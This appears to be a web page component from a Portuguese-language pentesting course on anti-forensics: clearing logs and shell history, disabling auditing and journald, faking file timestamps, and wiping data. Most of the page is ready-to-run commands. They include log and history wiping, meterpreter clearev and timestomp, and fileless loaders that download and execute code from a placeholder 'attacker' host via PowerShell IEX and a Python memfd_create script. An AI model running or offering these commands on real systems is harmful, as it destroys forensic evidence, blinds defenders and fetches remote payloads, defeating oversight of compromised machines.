import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function AntiForense() {
  return (
    <PageContainer
      title="Anti-Forense & Limpeza de Rastros"
      subtitle="Técnicas de anti-forense: limpeza de logs, timestamps, artefatos de memória e ocultação de atividade em pentests."
      difficulty="avancado"
      timeToRead="15 min"
    >
      <h2>Anti-Forense em Pentests</h2>
      <p>
        Em pentests avançados (Red Team), parte do teste inclui verificar se a equipe de defesa
        (Blue Team) consegue detectar e investigar a atividade do atacante. Anti-forense testa
        essa capacidade de detecção.
      </p>

      <AlertBox type="danger" title="Documentar TUDO">
        Em pentests profissionais, você DEVE documentar todas as suas ações antes de limpar rastros.
        O relatório precisa mostrar exatamente o que foi feito, quando e como.
      </AlertBox>

      <h2>Limpeza de Logs — Linux</h2>
      <CodeBlock
        title="Limpar logs em sistemas Linux"
        code={`# Ver logs principais
ls -la /var/log/

# Limpar logs específicos
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# Limpar histórico de comandos
history -c                    # Limpar histórico da sessão
echo "" > ~/.bash_history     # Limpar arquivo
unset HISTFILE                # Desabilitar logging
export HISTSIZE=0             # Não salvar comandos

# Remover entradas específicas (mais furtivo)
# Editar /var/log/auth.log e remover suas linhas
sed -i '/192.168.1.100/d' /var/log/auth.log

# Limpar logs do systemd/journald
journalctl --rotate
journalctl --vacuum-time=1s

# Limpar lastlog e wtmp (logins)
echo "" > /var/log/lastlog
echo "" > /var/log/wtmp
echo "" > /var/log/btmp

# Usar utmpdump para editar
utmpdump /var/log/wtmp > /tmp/wtmp.txt
# Editar /tmp/wtmp.txt
utmpdump -r < /tmp/wtmp.txt > /var/log/wtmp`}
      />

      <h2>Limpeza de Logs — Windows</h2>
      <CodeBlock
        title="Limpar logs em sistemas Windows"
        code={`# PowerShell — limpar Event Log
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# Limpar todos os logs
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

# Metasploit — clearev
meterpreter > clearev
# Limpa Security, System e Application logs

# Desabilitar logging temporariamente
auditpol /set /category:* /success:disable /failure:disable

# Limpar histórico PowerShell
Remove-Item (Get-PSReadlineOption).HistorySavePath
Clear-History

# Limpar prefetch (evidência de execução)
del C:\\Windows\\Prefetch\\*.pf

# Limpar recent files
del %APPDATA%\\Microsoft\\Windows\\Recent\\*`}
      />

      <h2>Manipulação de Timestamps</h2>
      <CodeBlock
        title="Alterar timestamps de arquivos"
        code={`# Linux — touch
# Copiar timestamp de outro arquivo
touch -r /etc/passwd malware.sh

# Definir timestamp específico
touch -t 202301151030.00 malware.sh
# Formato: YYYYMMDDhhmm.ss

# Windows — PowerShell
$(Get-Item shell.exe).CreationTime = "01/15/2023 10:30:00"
$(Get-Item shell.exe).LastWriteTime = "01/15/2023 10:30:00"
$(Get-Item shell.exe).LastAccessTime = "01/15/2023 10:30:00"

# Metasploit — timestomp
meterpreter > timestomp shell.exe -m "2023-01-15 10:30:00"
meterpreter > timestomp shell.exe -b  # Blank (zerar tudo)`}
      />

      <h2>Execução em Memória</h2>
      <CodeBlock
        title="Fileless — executar sem tocar o disco"
        code={`# PowerShell — download e execução em memória
IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')

# PowerShell — reflective DLL injection
$bytes = (New-Object Net.WebClient).DownloadData('http://attacker/payload.dll')
[System.Reflection.Assembly]::Load($bytes)

# Linux — memfd_create (sem arquivo no disco)
python3 -c "
import ctypes, urllib.request, os
libc = ctypes.CDLL('libc.so.6')
fd = libc.memfd_create(b'', 0)
data = urllib.request.urlopen('http://attacker/elf').read()
os.write(fd, data)
os.execve(f'/proc/self/fd/{fd}', [''], os.environ)
"

# Metasploit — execute in memory
meterpreter > execute -H -m -d calc.exe -f payload.exe
# -H: hidden, -m: from memory, -d: dummy process`}
      />

      <h2>Ferramentas de Anti-Forense</h2>
      <CodeBlock
        title="Ferramentas do Kali"
        code={`# Secure delete — sobrescrever arquivos
sudo apt install secure-delete

srm arquivo_sensivel.txt      # Remover com sobrescrita
sfill /tmp/                    # Limpar espaço livre
sswap /dev/sda2               # Limpar swap
smem                          # Limpar RAM

# shred — sobrescrever arquivo
shred -vfz -n 5 arquivo.txt
# -v: verbose, -f: force, -z: zero final, -n: passes

# dd — sobrescrever disco/partição
dd if=/dev/urandom of=arquivo.txt bs=1M count=1

# Metasploit anti-forensics
meterpreter > clearev           # Limpar event logs
meterpreter > timestomp -b *    # Zerar timestamps

# Linux — desabilitar logging
systemctl stop rsyslog
systemctl stop systemd-journald`}
      />
    </PageContainer>
  );
}
